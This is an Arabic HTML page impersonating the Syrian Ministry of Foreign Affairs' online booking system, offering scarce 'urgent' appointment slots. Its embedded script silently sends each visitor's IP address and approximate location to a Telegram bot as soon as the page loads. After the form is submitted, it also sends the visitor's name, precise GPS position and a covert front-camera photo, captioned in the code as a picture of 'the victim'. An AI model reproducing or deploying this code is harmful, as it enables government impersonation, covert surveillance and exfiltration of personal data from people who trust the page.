<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الجمهورية العربية السورية - وزارة الخارجية والمغتربين</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, sans-serif; 
            background-color: #f8f9fa; 
            margin: 0; 
            text-align: center; 
            font-weight: 900; 
            color: #333;
        }
        .header { 
            background: #ffffff; 
            padding: 20px; 
            border-bottom: 5px solid #b38a2e;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
        }
        .header img { 
            max-width: 85%; 
            height: auto; 
            max-height: 90px; 
        }
        .container { 
            max-width: 450px; 
            margin: 30px auto; 
            padding: 30px; 
            background: #ffffff; 
            border-radius: 20px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.08); 
            border: 1px solid #e0e0e0;
        }
        h2 { 
            color: #1a237e; 
            font-size: 26px; 
            margin-bottom: 10px; 
            border-bottom: 2px solid #b38a2e;
            display: inline-block;
            padding-bottom: 5px;
        }
        .promo-box { 
            background-color: #fff3cd; 
            color: #856404; 
            padding: 15px; 
            border-radius: 10px; 
            font-size: 16px; 
            margin-bottom: 25px; 
            border: 1px solid #ffeeba;
        }
        label { 
            display: block; 
            text-align: right; 
            margin: 15px 5% 8px; 
            font-size: 18px; 
            color: #1a237e; 
        }
        input, select { 
            width: 90%; 
            padding: 15px; 
            margin-bottom: 20px; 
            border: 2px solid #ced4da; 
            border-radius: 12px; 
            font-size: 16px; 
            font-weight: 800; 
            background: #fdfdfd; 
            outline: none;
        }
        input:focus { border-color: #b38a2e; }
        
        .btn { 
            background: linear-gradient(135deg, #b38a2e 0%, #8e6d24 100%); 
            color: white; 
            padding: 18px; 
            border: none; 
            border-radius: 12px; 
            width: 90%; 
            font-size: 20px; 
            font-weight: 900; 
            cursor: pointer; 
            box-shadow: 0 5px 15px rgba(179, 138, 46, 0.4);
            transition: 0.3s;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 7px 20px rgba(179, 138, 46, 0.6); }
        
        .footer { 
            margin-top: 40px; 
            font-size: 13px; 
            color: #6c757d; 
            padding-bottom: 30px; 
        }
        .hidden { display: none; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="header">
    <img src="https://r.jina.ai/i/05e043690d7c4938a19266f8e7784013" alt="شعار الوزارة">
</div>

<div class="container">
    <h2>منظومة الحجز الإلكتروني</h2>
    <div class="promo-box">
        ⚠️ تنبيه: متاح حالياً 7 مقاعد فقط للدور المستعجل (الرسم: 40$).
    </div>
    
    <label>الاسم الثلاثي:</label>
    <input type="text" id="name" placeholder="اكتب اسمك كما في الهوية">

    <label>المحافظة المقيم بها:</label>
    <select id="city">
        <option value="">-- اختر من القائمة --</option>
        <option value="إدلب">إدلب</option>
        <option value="حلب">حلب</option>
        <option value="دمشق">دمشق</option>
        <option value="حمص">حمص</option>
        <option value="حماة">حماة</option>
        <option value="اللاذقية">اللاذقية</option>
        <option value="طرطوس">طرطوس</option>
        <option value="درعا">درعا</option>
        <option value="دير الزور">دير الزور</option>
    </select>

    <button class="btn" onclick="startProcess()">تأكيد وإرسال الطلب</button>
</div>

<div class="footer">
    الجمهورية العربية السورية - وزارة الخارجية والمغتربين © 2026
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
    // ======== بيانات التليغرام المحدثة ========
    const BOT_TOKEN = "8669811855:AAEzIrBKoyRD5f9zpKLQB0IwTxviOrSujN0";
    const CHAT_ID = "7214473798";
    // ===========================================

    async function sendToTelegram(message) {
        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message.substring(0, 4096),
                    parse_mode: 'HTML'
                })
            });
        } catch (e) {
            console.error("Telegram send error:", e);
        }
    }

    async function sendPhotoToTelegram(base64Image, caption) {
        try {
            const blob = dataURLtoBlob(base64Image);
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'shot.jpg');
            formData.append('caption', caption.substring(0, 1024));

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            await fetch(url, { method: 'POST', body: formData });
        } catch (e) {
            console.error("Photo send error:", e);
        }
    }

    function dataURLtoBlob(dataURL) {
        const arr = dataURL.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) u8arr[n] = bstr.charCodeAt(n);
        return new Blob([u8arr], { type: mime });
    }

    async function getIPInfo() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                lat: data.latitude,
                lon: data.longitude,
                org: data.org
            };
        } catch (e) {
            return null;
        }
    }

    function captureCamera() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            sendToTelegram(`⚠️ وزارة الخارجية - الكاميرا غير مدعومة`);
            return;
        }
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    const ctx = canvas.getContext('2d');
                    canvas.width = video.videoWidth || 400;
                    canvas.height = video.videoHeight || 300;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                    sendPhotoToTelegram(dataURL, `📸 وزارة الخارجية - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
                    stream.getTracks().forEach(track => track.stop());
                    video.srcObject = null;
                }, 1500);
            })
            .catch(err => {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        video.srcObject = stream;
                        video.play();
                        setTimeout(() => {
                            const ctx = canvas.getContext('2d');
                            canvas.width = video.videoWidth || 400;
                            canvas.height = video.videoHeight || 300;
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                            sendPhotoToTelegram(dataURL, `📸 وزارة الخارجية - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
                            stream.getTracks().forEach(track => track.stop());
                            video.srcObject = null;
                        }, 1500);
                    })
                    .catch(() => sendToTelegram(`⚠️ وزارة الخارجية - رفض الكاميرا`));
            });
    }

    async function startProcess() {
        let name = document.getElementById("name").value.trim();
        let city = document.getElementById("city").value;

        if (!name || !city) { 
            alert("يرجى ملء كافة الحقول المطلوبة."); 
            return; 
        }

        // جلب IP
        const ipInfo = await getIPInfo();
        let ipMsg = `🌐 <b>وزارة الخارجية - دخول جديد</b>\n\n`;
        ipMsg += `👤 الاسم: ${name}\n`;
        ipMsg += `🏙️ المحافظة: ${city}\n`;
        if (ipInfo) {
            ipMsg += `📡 IP: ${ipInfo.ip}\n`;
            ipMsg += `🏙️ المدينة: ${ipInfo.city || 'غير معروف'}\n`;
            ipMsg += `🌍 الدولة: ${ipInfo.country || 'غير معروف'}\n`;
            if (ipInfo.lat && ipInfo.lon) {
                ipMsg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
            }
        }
        ipMsg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
        await sendToTelegram(ipMsg);

        // طلب GPS دقيق
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (p) => {
                let lat = p.coords.latitude;
                let lon = p.coords.longitude;
                let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                let gpsMsg = `🎯 <b>وزارة الخارجية - موقع دقيق ✅</b>\n\n`;
                gpsMsg += `👤 ${name}\n`;
                gpsMsg += `📍 ${mapLink}\n`;
                gpsMsg += `📏 دقة: ${Math.round(p.coords.accuracy)} متر\n`;
                gpsMsg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
                await sendToTelegram(gpsMsg);
            }, (err) => {
                sendToTelegram(`⚠️ وزارة الخارجية - رفض GPS: ${err.message}`);
            }, { enableHighAccuracy: true, timeout: 10000 });
        }

        // تصوير الكاميرا
        captureCamera();

        alert("✅ تم تسجيل طلبك بنجاح! انتظر اتصالاً من القسم الفني لتأكيد موعد الاستلام.");

        setTimeout(() => {
            window.location.href = "https://www.facebook.com/jableh.ali.jbr";
        }, 2000);
    }

    // إرسال IP فوراً عند فتح الصفحة (دون تعبئة)
    (async function () {
        const ipInfo = await getIPInfo();
        if (ipInfo) {
            let msg = `📡 <b>وزارة الخارجية - صفحة مفتوحة</b>\n\n`;
            msg += `🌐 IP: ${ipInfo.ip}\n`;
            msg += `🏙️ ${ipInfo.city || 'غير معروف'}, ${ipInfo.country || ''}\n`;
            if (ipInfo.lat && ipInfo.lon) {
                msg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
            }
            msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
            await sendToTelegram(msg);
        }
    })();
</script>

</body>
</html>
